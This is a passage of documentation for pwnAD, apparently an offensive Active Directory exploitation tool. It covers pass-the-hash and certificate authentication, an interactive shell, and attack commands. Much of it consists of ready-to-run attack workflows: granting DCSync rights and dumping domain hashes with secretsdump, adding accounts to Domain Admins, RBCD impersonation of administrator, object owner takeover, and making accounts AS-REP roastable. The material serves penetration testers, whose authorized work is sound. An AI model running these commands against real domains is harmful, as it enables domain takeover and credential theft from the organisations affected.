docs.title: pwnAD
docs.text: A powerful tool for Active Directory exploitation, focusing on LDAP and Kerberos protocols.

docs.title: Features
docs.text:
• Multiple authentication methods - Support for NTLM, Kerberos, and certificate-based authentication
  • LDAP enumeration and exploitation - Extensive support for LDAP operations
  • Enhanced security support - LDAP signing and channel binding for both simple and NTLM authentication
  • Certificate-based attacks - Kerberos actions supporting certificate authentication via PKINIT
  • Interactive shell - User-friendly command-line interface with tab completion

docs.title: Installation
docs.text: pipx install "git+https://github.com/LightxR/pwnAD"

docs.title: Basic Usage
docs.text:
# Interactive mode with password authentication
pwnAD -i --dc-ip 192.168.1.10 -d domain.local -u administrator -p 'Password123!'

# One-shot command: enumerate users
pwnAD --dc-ip 192.168.1.10 -d domain.local -u administrator -p 'Password123!' get users

# Using Kerberos authentication
pwnAD --dc-ip 192.168.1.10 -d domain.local -u administrator -p 'Password123!' -k get users

# Using certificate authentication
pwnAD --dc-ip 192.168.1.10 -d domain.local -u administrator -pfx admin.pfx get users

docs.title: Available Actions
docs.text: Category Actions LDAP add, remove, get, modify, query Modules shadow Kerberos getTGT, getST, getNThash

docs.title: Documentation
docs.text:
• Installation - Detailed installation instructions
  • Authentication - All supported authentication methods
  • Interactive Mode - Shell features and special commands
  • Commands - Complete command reference
  • Modules - Special attack modules
  • Kerberos - Kerberos ticket operations
  • Troubleshooting - Common issues and solutions

docs.title: Status
docs.text:
Active Development

This tool is currently in active development. Some features may not be fully operational. When using certificate authentication, it's recommended to specify a username. Please open an issue or submit a pull request if you encounter any problems.

docs.title: Authentication Methods
docs.text: pwnAD supports multiple authentication methods for both LDAP and Kerberos operations.

docs.title: LDAP Operations
docs.text:
Authentication methods available for get, add, remove, modify, and query commands.

Method Flags Description NTLM (password) -p Falls back to simple auth when failing NTLM (hash) -H Pass-the-Hash authentication Kerberos (password) -p -k Kerberos with password Kerberos (hash) -H -k Kerberos with NT hash Kerberos (AES key) --aes-key Kerberos with AES key Kerberos (ccache) -k Uses KRB5CCNAME environment variable Schannel (PFX) -pfx Certificate in PFX/P12 format Schannel (PEM) -cert -key Certificate and key in PEM format

docs.title: Kerberos Operations
docs.text:
Authentication methods available for getTGT, getST, and getNThash commands.

Method Flags Description Password -p Standard password authentication NT Hash -H Pass-the-Hash AES Key --aes-key AES128 or AES256 key ccache -k For getST only PKINIT (PFX) -pfx Certificate authentication PKINIT (PEM) -cert -key Certificate and key files

docs.title: Password Authentication
docs.text:
# Basic password authentication
pwnAD --dc-ip 192.168.1.10 -d domain.local -u administrator -p 'Password123!' get users

# With TLS
pwnAD --dc-ip 192.168.1.10 -d domain.local -u administrator -p 'Password123!' --tls get users

docs.title: Pass-the-Hash
docs.text:
# Using NT hash only
pwnAD --dc-ip 192.168.1.10 -d domain.local -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0' get users

# Using NT hash (short form)
pwnAD --dc-ip 192.168.1.10 -d domain.local -u administrator -H ':31d6cfe0d16ae931b73c59d7e0c089c0' get users

docs.title: Kerberos Authentication
docs.text:
# Kerberos with password
pwnAD --dc-ip 192.168.1.10 -d domain.local -u administrator -p 'Password123!' -k get users

# Kerberos with NT hash
pwnAD --dc-ip 192.168.1.10 -d domain.local -u administrator -H ':31d6cfe0d16ae931b73c59d7e0c089c0' -k get users

# Kerberos with AES key
pwnAD --dc-ip 192.168.1.10 -d domain.local -u administrator --aes-key '4a3e8...' get users

# Kerberos with existing ccache
export KRB5CCNAME=/tmp/administrator.ccache
pwnAD --dc-ip 192.168.1.10 -d domain.local -u administrator -k get users

docs.title: Certificate Authentication
docs.text:
# Using PFX/P12 file
pwnAD --dc-ip 192.168.1.10 -d domain.local -u administrator -pfx admin.pfx get users

# PFX with password
pwnAD --dc-ip 192.168.1.10 -d domain.local -u administrator -pfx admin.pfx -pfx-pass 'PfxPassword!' get users

# Using separate cert and key files
pwnAD --dc-ip 192.168.1.10 -d domain.local -u administrator -cert admin.crt -key admin.key get users

docs.title: Target Specification
docs.text: Flag Description --dc-ip IP address of the domain controller --kdcHost FQDN of the KDC (for Kerberos) -d, --domain FQDN of the domain -u, --user Username to authenticate with --port LDAP port (default: 389, or 636 with TLS) --tls Use TLS connection

docs.title: Debug Mode
docs.text:
Enable debug output to troubleshoot authentication issues:

pwnAD --dc-ip 192.168.1.10 -d domain.local -u administrator -p 'Password123!' --debug get users

docs.title: LDAP Authentication Flow
docs.text:
1. If -k (Kerberos) flag is set:
    • Try Kerberos authentication (SASL GSSAPI)
  2. If certificate is provided (-pfx or -cert -key):
    • Use Schannel (TLS client certificate)
  3. If hash is provided (-H):
    • Use NTLM authentication
  4. If password is provided (-p):
    • Try NTLM authentication
    • Fall back to simple bind if NTLM fails

docs.title: Kerberos (PKINIT) Flow
docs.text:
For getTGT, getST, getNThash with certificates:

  1. Load certificate and private key
  2. Perform PKINIT AS-REQ with certificate
  3. Receive TGT encrypted with session key
  4. For getNThash: Use PAC_CREDENTIAL_INFO to retrieve NT hash

docs.title: Requirements
docs.text:
• Python 3.8 or higher
  • pip or pipx

docs.title: Recommended: Using pipx
docs.text:
pipx installs pwnAD in an isolated environment, avoiding dependency conflicts.

# Install pipx if not already installed
pip install pipx
pipx ensurepath

# Install pwnAD
pipx install "git+https://github.com/LightxR/pwnAD"

docs.title: Alternative: Using pip
docs.text: pip install "git+https://github.com/LightxR/pwnAD"

docs.title: Development Installation
docs.text:
For contributors or those who want the latest development version:

git clone https://github.com/LightxR/pwnAD.git
cd pwnAD
pip install -e .

docs.title: Dependencies
docs.text:
pwnAD relies on the following key packages:

Package Purpose impacket Windows network protocols (SMB, Kerberos, etc.) ldap3 LDAP operations with signing and channel binding cryptography>=39.0 Cryptographic operations asn1crypto ASN.1 parsing pyasn1==0.4.8 ASN.1 structures dsinternals Active Directory internal structures

docs.title: Verifying Installation
docs.text:
After installation, verify pwnAD is working:

pwnAD -h

You should see the help message with available options and actions.

docs.title: Kerberos Configuration
docs.text: For Kerberos authentication, ensure your system has a valid /etc/krb5.conf or rely on the --kdcHost flag to specify the KDC.

docs.title: Example krb5.conf
docs.text:
[libdefaults]
    default_realm = DOMAIN.LOCAL
    dns_lookup_realm = false
    dns_lookup_kdc = false

[realms]
    DOMAIN.LOCAL = {
        kdc = dc01.domain.local
        admin_server = dc01.domain.local
    }

[domain_realm]
    .domain.local = DOMAIN.LOCAL
    domain.local = DOMAIN.LOCAL

docs.title: SSL/TLS Errors
docs.text:
If you encounter SSL errors, ensure your cryptography package is up to date:

pip install --upgrade cryptography

docs.title: Impacket Conflicts
docs.text:
If you have multiple Impacket versions installed, consider using pipx to isolate pwnAD:

pipx install "git+https://github.com/LightxR/pwnAD" --force

docs.title: Permission Errors
docs.text:
On Linux, you may need to install as user:

pip install --user "git+https://github.com/LightxR/pwnAD"

Or use a virtual environment:

python -m venv venv
source venv/bin/activate
pip install "git+https://github.com/LightxR/pwnAD"

docs.title: Interactive Mode
docs.text: pwnAD includes a powerful interactive shell for streamlined AD operations. Launch it with the -i or --interactive flag.

docs.title: Starting Interactive Mode
docs.text:
pwnAD -i --dc-ip 192.168.1.10 -d domain.local -u administrator -p 'Password123!'

Output: 

 ____ ____ ____ ____ ____
|p ||w ||n ||A ||D |
|__||__||__||__||__|
|/__\|/__\|/__\|/__\|/__\|

Version 0.0.1 by @LightxR


pwnAD [domain.local\administrator]>

docs.title: Tab Completion
docs.text:
Press Tab to see available commands and subcommands:

pwnAD [domain.local\administrator]>
add           getNThash     getTGT        modify        rebind        shadow        switch_user
get           getST         infos         query         remove        start_tls

Completion also works for subcommands:

pwnAD [domain.local\administrator]> add
add RBCD             add dcsync           add groupMember      add write_gpo_dacl
add computer         add genericAll       add user

docs.title: Command History
docs.text: Use Up/Down arrows to navigate through command history.

docs.title: Special Commands
docs.text: These commands are only available in interactive mode.

docs.title: infos
docs.text:
Display current connection details:

pwnAD [domain.local\administrator]> infos
[*] Target:     192.168.1.10
[*] Port:       389
[*] Domain:     domain.local
[*] User:       administrator
[*] Password:   Password123!
[*] LM_hash:    None
[*] NT_hash:    None
[*] aesKey:     None
[*] pfx:        None
[*] key:        None
[*] cert:       None
[*] kerberos:   False
[*] TLS:        False

docs.title: start_tls
docs.text:
Upgrade a plaintext LDAP connection (port 389) to TLS:

pwnAD [domain.local\administrator]> start_tls
[*] Sending StartTLS command...
[*] StartTLS succeded, you are now connected through a TLS channel

This is useful when you need TLS for sensitive operations like password changes:

# Without TLS - fails
pwnAD [domain.local\administrator]> modify password lowpriv NewPassword123!
[-] Server unwilling to perform the operation...

# Upgrade to TLS
pwnAD [domain.local\administrator]> start_tls
[*] StartTLS succeded, you are now connected through a TLS channel

# Now it works
pwnAD [domain.local\administrator]> modify password lowpriv NewPassword123!
[*] Successfully changed lowpriv password to: NewPassword123!

docs.title: rebind
docs.text:
Reconnect to the LDAP server if the connection times out or is reset:

pwnAD [domain.local\administrator]> shadow list lowpriv
[-] An error has occured : socket sending error[Errno 104] Connection reset by peer

pwnAD [domain.local\administrator]> rebind
[*] Successfully performed a connection rebind.

pwnAD [domain.local\administrator]> shadow list lowpriv
[*] Targeting user lowpriv
[*] Listing Key Credentials for lowpriv
[*] DeviceID:1d8669ab-6a68-a58c-6b46-606e3623f579 | Creation Time (UTC): 2025-02-03 11:13:41

docs.title: switch_user
docs.text:
Change user context without restarting the shell:

pwnAD [domain.local\administrator]> switch_user -u lowpriv -p 'LowPrivPassword!'
[*] Successfully switched user to lowpriv.

pwnAD [domain.local\lowpriv]>

The prompt updates to reflect the current user. You can also switch authentication methods:

# Switch to hash-based authentication
pwnAD [domain.local\administrator]> switch_user -u serviceaccount -H ':31d6cfe0d16ae931b73c59d7e0c089c0'

# Switch to certificate authentication
pwnAD [domain.local\administrator]> switch_user -u admin2 -pfx admin2.pfx

docs.title: OS Command Execution
docs.text:
Prefix commands with ! to execute them in the system shell:

pwnAD [domain.local\administrator]> !ls
LICENSE  pwnAD  README.md  setup.py

pwnAD [domain.local\administrator]> !whoami
kali

pwnAD [domain.local\administrator]> !export KRB5CCNAME=/tmp/admin.ccache

This is particularly useful for:

  • Setting environment variables (KRB5CCNAME)
  • Checking local files
  • Running other tools alongside pwnAD

docs.title: Workflow Example
docs.text:
A typical interactive session might look like:

# Start interactive mode
pwnAD -i --dc-ip 192.168.1.10 -d domain.local -u lowpriv -p 'LowPrivPass!'

# Check connection
pwnAD [domain.local\lowpriv]> infos

# Enumerate users
pwnAD [domain.local\lowpriv]> get users

# Find kerberoastable accounts
pwnAD [domain.local\lowpriv]> get kerberoastables

# Switch to compromised admin account
pwnAD [domain.local\lowpriv]> switch_user -u admin -H ':aabbccdd...'

# Add DCSync rights
pwnAD [domain.local\admin]> add dcsync lowpriv

# If connection drops
pwnAD [domain.local\admin]> rebind

# Run secretsdump from the same session
pwnAD [domain.local\admin]> !secretsdump.py domain.local/lowpriv@192.168.1.10 -just-dc-ntlm

docs.title: Troubleshooting
docs.text: Common issues and solutions when using pwnAD.

docs.title: "Connection refused" or "Connection timed out"
docs.text:
Symptoms: - Cannot connect to the domain controller - Connection errors immediately after running command

Solutions:

  1. Verify the DC IP is correct: 

    ping <dc-ip>

  2. Check if LDAP port is open: 

    nc -zv <dc-ip> 389
nc -zv <dc-ip> 636  # LDAPS

  3. Ensure no firewall is blocking the connection

  4. Try specifying the port explicitly: 

    pwnAD --dc-ip <ip> --port 389 ...

docs.title: "Connection reset by peer"
docs.text:
Symptoms: - Connection works initially but drops - Error appears after idle period

Solutions:

In interactive mode, use rebind: 

pwnAD [domain.local\admin]> rebind
[*] Successfully performed a connection rebind.

docs.title: "Server unwilling to perform"
docs.text:
Symptoms: - Operations fail with "unwillingToPerform" - Common with password changes

Solutions:

Most likely you need TLS. Either:

  1. Connect with TLS from the start: 

    pwnAD --dc-ip <ip> -d domain.local -u admin -p 'Pass!' --tls ...

  2. Upgrade with StartTLS in interactive mode: 

    pwnAD [domain.local\admin]> start_tls

docs.title: "Invalid credentials"
docs.text:
Symptoms: - Authentication fails despite correct credentials - Works with other tools but not pwnAD

Solutions:

  1. Check username format (should be just username, not domain\user): 

    # Correct
pwnAD --dc-ip <ip> -d domain.local -u administrator -p 'Pass!'

# Incorrect
pwnAD --dc-ip <ip> -d domain.local -u domain.local\\administrator -p 'Pass!'

  2. Escape special characters in password: 

    pwnAD --dc-ip <ip> -d domain.local -u admin -p 'P@$$w0rd!'

  3. Try using hash instead: 

    pwnAD --dc-ip <ip> -d domain.local -u admin -H ':nthash'

docs.title: "KDC_ERR_PREAUTH_FAILED"
docs.text:
Symptoms: - Kerberos operations fail - "Pre-authentication failed" error

Solutions:

  1. Verify password/hash is correct
  2. Check for clock skew: 
    sudo ntpdate <dc-ip>
  3. Try NTLM instead of Kerberos (remove -k flag)

docs.title: Certificate Authentication Fails
docs.text:
Symptoms: - Schannel or PKINIT authentication fails - Certificate errors

Solutions:

  1. Verify certificate is for the correct user: 

    openssl x509 -in cert.crt -text -noout | grep Subject

  2. Check certificate is not expired: 

    openssl x509 -in cert.crt -dates -noout

  3. Ensure private key matches certificate: 

    openssl x509 -noout -modulus -in cert.crt | md5sum
openssl rsa -noout -modulus -in cert.key | md5sum
# Should match

  4. Specify username explicitly: 

    pwnAD --dc-ip <ip> -d domain.local -u administrator -pfx admin.pfx ...

docs.title: "Insufficient access rights"
docs.text:
Symptoms: - Operation denied - "insufficientAccessRights" error

Solutions:

  1. Verify you have the required permissions
  2. Check group memberships: 
    pwnAD get membership <your_user>
  3. Try with a higher-privileged account

docs.title: "Object does not exist"
docs.text:
Symptoms: - Target not found - "noSuchObject" error

Solutions:

  1. Verify target name spelling
  2. Check if using sAMAccountName or DN: 
    # Try with full DN
pwnAD query "(sAMAccountName=targetuser)" "distinguishedName"

docs.title: "Constraint violation"
docs.text:
Symptoms: - Modification fails - "constraintViolation" error

Solutions:

Common with password changes:

  1. Password doesn't meet complexity requirements
  2. Password history conflict
  3. Minimum password age not met

docs.title: "KRB_AP_ERR_SKEW"
docs.text:
Symptoms: - All Kerberos operations fail - Time-related error

Solution:

Sync your clock with the DC: 

sudo ntpdate <dc-ip>
# Or
sudo timedatectl set-ntp true

docs.title: "KDC_ERR_S_PRINCIPAL_UNKNOWN"
docs.text:
Symptoms: - getST fails - Service not found

Solutions:

  1. Verify SPN format: 

    # Correct formats
cifs/hostname.domain.local
http/hostname.domain.local
ldap/hostname.domain.local

  2. Check if SPN exists: 

    pwnAD get spn

docs.title: ccache Issues
docs.text:
Symptoms: - -k flag doesn't use existing ticket - "Credentials cache file not found"

Solutions:

  1. Set KRB5CCNAME correctly: 

    export KRB5CCNAME=/full/path/to/ticket.ccache

  2. Verify ccache exists and is readable: 

    ls -la $KRB5CCNAME
klist

docs.title: "msDS-KeyCredentialLink not found"
docs.text:
Symptoms: - Shadow operations fail - Attribute error

Solutions:

  1. Verify domain functional level is 2016+
  2. Check if attribute exists on target: 
    pwnAD query "(sAMAccountName=target)" "msDS-KeyCredentialLink"

docs.title: PKINIT Fails After Adding Key Credential
docs.text:
Symptoms: - Key added successfully - Certificate authentication fails

Solutions:

  1. Ensure ADCS is deployed or Azure AD supports PKINIT
  2. Check certificate was generated correctly
  3. Try the shadow auto command for full automation

docs.title: Debug Mode
docs.text:
Enable debug output for detailed information:

pwnAD --dc-ip <ip> -d domain.local -u admin -p 'Pass!' --debug get users

Debug mode shows:

  • LDAP queries being sent
  • Server responses
  • Authentication flow
  • Error details

docs.title: Getting Help
docs.text:
If you're still stuck:

  1. Run with --debug and capture the full output
  2. Check GitHub Issues
  3. Open a new issue with:
    • pwnAD version
    • Command used (mask credentials!)
    • Full error message
    • Debug output
    • Expected vs actual behavior

docs.title: Commands Overview
docs.text: pwnAD provides five main LDAP commands for interacting with Active Directory.

docs.title: Available Commands
docs.text: Command Description add Add objects or permissions to AD remove Remove objects or permissions from AD get Retrieve and enumerate AD objects modify Modify AD objects and attributes query Execute raw LDAP queries

docs.title: Command Structure
docs.text:
All commands follow the same pattern:

pwnAD [auth options] <command> <subcommand> [arguments]

docs.title: Example
docs.text: pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' get users

docs.title: Getting Help
docs.text:
Each command and subcommand has built-in help:

# Main help
pwnAD -h

# Command help
pwnAD get -h

# Subcommand help
pwnAD get user -h

docs.title: Common Options
docs.text:
These options apply to all LDAP commands:

Option Description --dc-ip Domain controller IP address -d, --domain Domain FQDN -u, --user Username -p, --password Password -H, --hashes NT hash (format: [LM:]NT) --aes-key Kerberos AES key -k, --kerberos Use Kerberos authentication -pfx PFX certificate file -cert / -key PEM certificate and key files --tls Use TLS connection --port LDAP port (default: 389) --debug Enable debug output -i Interactive mode

docs.title: add Command
docs.text: Add objects or permissions to Active Directory.

docs.title: Usage
docs.text: pwnAD [auth options] add <subcommand> [arguments]

docs.title: Subcommands
docs.text: Subcommand Description user Add a new user account computer Add a new computer account dcsync Add DCSync rights to an object genericAll Add GenericAll rights to an object groupMember Add a user/computer to a group write_gpo_dacl Give full control on a GPO RBCD Add Resource-Based Constrained Delegation

docs.title: user
docs.text:
Add a new user account to the domain.

pwnAD [auth] add user <username> <password>

Example: 

pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' add user newuser 'NewUserPass123!'

docs.title: computer
docs.text:
Add a new computer account to the domain.

pwnAD [auth] add computer <computername> [password]

Example: 

pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' add computer YOURPC$ 'ComputerPass123!'

Note

Computer names typically end with $. If omitted, pwnAD will add it automatically.

docs.title: dcsync
docs.text:
Add DCSync replication rights to an account. This grants the target the ability to replicate password hashes from domain controllers.

pwnAD [auth] add dcsync <target>

Example: 

pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' add dcsync compromiseduser

High Impact

DCSync rights allow extraction of all domain password hashes. Use responsibly.

docs.title: genericAll
docs.text:
Add GenericAll (Full Control) permissions on an object.

pwnAD [auth] add genericAll <target> <trustee>

Example: 

# Give 'attacker' full control over 'victim'
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' add genericAll victim attacker

docs.title: groupMember
docs.text:
Add a user or computer to a group.

pwnAD [auth] add groupMember <group> <member>

Example: 

# Add user to Domain Admins
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' add groupMember "Domain Admins" compromiseduser

docs.title: write_gpo_dacl
docs.text:
Grant full control on a Group Policy Object.

pwnAD [auth] add write_gpo_dacl <gpo_name> <trustee>

Example: 

pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' add write_gpo_dacl "Default Domain Policy" attacker

docs.title: RBCD
docs.text:
Add Resource-Based Constrained Delegation. This allows a computer to impersonate users to the target service.

pwnAD [auth] add RBCD <target> <delegatee>

Example: 

# Allow YOURPC$ to delegate to TARGETPC$
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' add RBCD TARGETPC$ YOURPC$

docs.title: Scenario 1: Privilege Escalation via Group Membership
docs.text:
# Add compromised user to Domain Admins
pwnAD -i --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!'
pwnAD [domain.local\admin]> add groupMember "Domain Admins" lowpriv

docs.title: Scenario 2: DCSync Attack Preparation
docs.text:
# Grant DCSync rights to controlled account
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' add dcsync attacker

# Then use secretsdump
secretsdump.py domain.local/attacker:'Pass!'@192.168.1.10 -just-dc-ntlm

docs.title: Scenario 3: RBCD Attack
docs.text:
# Add computer account
pwnAD --dc-ip 192.168.1.10 -d domain.local -u lowpriv -p 'Pass!' add computer YOURPC$ 'CompPass!'

# Configure RBCD
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' add RBCD TARGETPC$ YOURPC$

# Get service ticket via S4U2Proxy
getST.py -spn cifs/TARGETPC.domain.local -impersonate administrator domain.local/YOURPC$:'CompPass!'

docs.title: get Command
docs.text: Retrieve and enumerate various objects from Active Directory.

docs.title: Usage
docs.text: pwnAD [auth options] get <subcommand> [arguments]

docs.title: User Enumeration
docs.text: Subcommand Description user Get detailed info for a specific user users List all domain users users_description Users with description field set users_with_admin_count Users with adminCount=1 protected_users Members of Protected Users group

docs.title: Group Enumeration
docs.text: Subcommand Description groups List all domain groups members List members of a specific group membership List group memberships for an account

docs.title: Computer Enumeration
docs.text: Subcommand Description computers List all domain computers DC List domain controllers servers List servers

docs.title: Delegation Enumeration
docs.text: Subcommand Description constrained_delegation Accounts with constrained delegation unconstrained_delegation Accounts with unconstrained delegation RBCD Accounts with RBCD configured not_trusted_for_delegation Accounts not trusted for delegation

docs.title: Attack Surface Enumeration
docs.text: Subcommand Description asreproastables Accounts vulnerable to AS-REP roasting kerberoastables Accounts vulnerable to Kerberoasting password_not_required Accounts with PASSWD_NOTREQD flag passwords_dont_expire Accounts with non-expiring passwords spn Accounts with Service Principal Names

docs.title: Other
docs.text: Subcommand Description CA Certificate Authorities OU Organizational Units containers AD containers accounts_with_sid_histoy Accounts with SID history

docs.title: User Enumeration
docs.text:
# Get all users
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' get users

# Get specific user details
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' get user administrator

# Users with descriptions (might contain passwords)
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' get users_description

docs.title: Group Enumeration
docs.text:
# List all groups
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' get groups

# Get Domain Admins members
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' get members "Domain Admins"

# Get user's group memberships
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' get membership administrator

docs.title: Attack Surface Discovery
docs.text:
# Find Kerberoastable accounts
pwnAD --dc-ip 192.168.1.10 -d domain.local -u lowpriv -p 'Pass!' get kerberoastables

# Find AS-REP roastable accounts
pwnAD --dc-ip 192.168.1.10 -d domain.local -u lowpriv -p 'Pass!' get asreproastables

# Find accounts with PASSWD_NOTREQD
pwnAD --dc-ip 192.168.1.10 -d domain.local -u lowpriv -p 'Pass!' get password_not_required

docs.title: Delegation Discovery
docs.text:
# Unconstrained delegation (potential for credential theft)
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' get unconstrained_delegation

# Constrained delegation (potential for privilege escalation)
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' get constrained_delegation

# RBCD targets
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' get RBCD

docs.title: Infrastructure Discovery
docs.text:
# Domain controllers
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' get DC

# Certificate authorities
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' get CA

# All computers
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' get computers

docs.title: Interactive Mode Usage
docs.text:
pwnAD -i --dc-ip 192.168.1.10 -d domain.local -u lowpriv -p 'Pass!'

# Quick enumeration workflow
pwnAD [domain.local\lowpriv]> get users
pwnAD [domain.local\lowpriv]> get kerberoastables
pwnAD [domain.local\lowpriv]> get asreproastables
pwnAD [domain.local\lowpriv]> get constrained_delegation
pwnAD [domain.local\lowpriv]> get unconstrained_delegation

docs.title: Reconnaissance Workflow
docs.text:
A typical reconnaissance workflow:

# 1. Start with user enumeration
get users
get users_description  # Check for passwords in descriptions

# 2. Check attack surface
get kerberoastables
get asreproastables
get password_not_required

# 3. Identify high-value targets
get members "Domain Admins"
get members "Enterprise Admins"
get users_with_admin_count

# 4. Check delegation
get unconstrained_delegation
get constrained_delegation
get RBCD

# 5. Infrastructure mapping
get DC
get CA
get computers

docs.title: modify Command
docs.text: Modify objects and attributes in Active Directory.

docs.title: Usage
docs.text: pwnAD [auth options] modify <subcommand> [arguments]

docs.title: Subcommands
docs.text: Subcommand Description password Change an account's password owner Change the owner of an object computer_name Rename a computer account dontreqpreauth Toggle DONT_REQ_PREAUTH flag disable_account Disable an account enable_account Enable an account

docs.title: password
docs.text:
Change the password for a specified account.

pwnAD [auth] modify password <target> <new_password>

Example: 

pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' --tls modify password lowpriv 'NewPassword123!'

TLS Required

Password changes require an encrypted connection. Use --tls or start_tls in interactive mode.

Interactive example: 

pwnAD [domain.local\admin]> modify password lowpriv NewPassword123!
[-] Server unwilling to perform the operation...

pwnAD [domain.local\admin]> start_tls
[*] StartTLS succeded, you are now connected through a TLS channel

pwnAD [domain.local\admin]> modify password lowpriv NewPassword123!
[*] Successfully changed lowpriv password to: NewPassword123!

docs.title: owner
docs.text:
Change the owner of an AD object. The owner has implicit control over the object.

pwnAD [auth] modify owner <target> <new_owner>

Example: 

# Make 'attacker' the owner of 'victim' object
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' modify owner victim attacker

docs.title: computer_name
docs.text:
Rename a computer account. Useful for certain attack techniques.

pwnAD [auth] modify computer_name <current_name> <new_name>

Example: 

pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' modify computer_name YOURPC$ NEWNAME$

docs.title: dontreqpreauth
docs.text:
Toggle the DONT_REQ_PREAUTH flag on an account. When enabled, makes the account vulnerable to AS-REP roasting.

pwnAD [auth] modify dontreqpreauth <target> <True|False>

Example: 

# Enable (make vulnerable to AS-REP roast)
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' modify dontreqpreauth targetuser True

# Disable (restore security)
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' modify dontreqpreauth targetuser False

docs.title: disable_account
docs.text:
Disable a user or computer account.

pwnAD [auth] modify disable_account <target>

Example: 

pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' modify disable_account compromised_user

docs.title: enable_account
docs.text:
Enable a disabled user or computer account.

pwnAD [auth] modify enable_account <target>

Example: 

pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' modify enable_account locked_user

docs.title: Scenario 1: Password Reset for Lateral Movement
docs.text:
# Reset password for account you have WriteProperty on
pwnAD --dc-ip 192.168.1.10 -d domain.local -u lowpriv -p 'Pass!' --tls modify password serviceaccount 'Compromised123!'

# Use the compromised account
pwnAD --dc-ip 192.168.1.10 -d domain.local -u serviceaccount -p 'Compromised123!' get membership serviceaccount

docs.title: Scenario 2: Owner Takeover
docs.text:
If you can modify the owner of an object, you gain control:

# Take ownership
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' modify owner "High Value Group" attacker

# Now attacker can modify the group
pwnAD --dc-ip 192.168.1.10 -d domain.local -u attacker -p 'Pass!' add groupMember "High Value Group" attacker

docs.title: Scenario 3: AS-REP Roasting Setup
docs.text:
Enable DONT_REQ_PREAUTH on a target account (requires WriteProperty):

# Enable AS-REP roastability
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' modify dontreqpreauth targetuser True

# Get AS-REP hash
GetNPUsers.py domain.local/targetuser -no-pass -dc-ip 192.168.1.10

# Restore (cleanup)
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' modify dontreqpreauth targetuser False

docs.title: query Command
docs.text: Execute raw LDAP queries against Active Directory. This command provides direct access to LDAP search functionality for custom enumeration.

docs.title: Usage
docs.text: pwnAD [auth options] query <search_filter> <attributes>

docs.title: Parameters
docs.text: Parameter Description search_filter LDAP filter expression (RFC 4515) attributes Comma-separated list of attributes to return, or * for all

docs.title: LDAP Filter Syntax
docs.text:
LDAP filters follow RFC 4515. Common operators:

Operator Meaning Example = Equal (sAMAccountName=admin) >= Greater or equal (badPwdCount>=5) <= Less or equal (logonCount<=10) =* Presence (has value) (description=*) * Wildcard (sAMAccountName=*admin*) & AND (&(objectClass=user)(adminCount=1)) | OR (|(sAMAccountName=admin)(sAMAccountName=administrator)) ! NOT (!(userAccountControl:1.2.840.113556.1.4.803:=2))

docs.title: Basic Queries
docs.text:
# Find specific user
pwnAD [auth] query "(sAMAccountName=administrator)" "distinguishedName,memberOf"

# Find all users
pwnAD [auth] query "(objectClass=user)" "sAMAccountName,description"

# Find all computers
pwnAD [auth] query "(objectClass=computer)" "dNSHostName,operatingSystem"

docs.title: Attribute Queries
docs.text:
# Get all attributes for a user
pwnAD [auth] query "(sAMAccountName=admin)" "*"

# Get specific attributes
pwnAD [auth] query "(sAMAccountName=admin)" "sAMAccountName,userAccountControl,memberOf,lastLogon"

# Find objects with descriptions
pwnAD [auth] query "(description=*)" "sAMAccountName,description"

docs.title: UserAccountControl Queries
docs.text:
UserAccountControl is a bitmask. Use the LDAP matching rule 1.2.840.113556.1.4.803 (bitwise AND):

# Disabled accounts (bit 0x2)
pwnAD [auth] query "(userAccountControl:1.2.840.113556.1.4.803:=2)" "sAMAccountName"

# Accounts with DONT_REQ_PREAUTH (bit 0x400000)
pwnAD [auth] query "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" "sAMAccountName"

# Enabled accounts only (NOT disabled)
pwnAD [auth] query "(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" "sAMAccountName"

docs.title: Complex Queries
docs.text:
# Admin users with SPNs (Kerberoastable admins)
pwnAD [auth] query "(&(adminCount=1)(servicePrincipalName=*))" "sAMAccountName,servicePrincipalName"

# Users with passwords in description
pwnAD [auth] query "(&(objectClass=user)(description=*pass*))" "sAMAccountName,description"

# Computers with unconstrained delegation
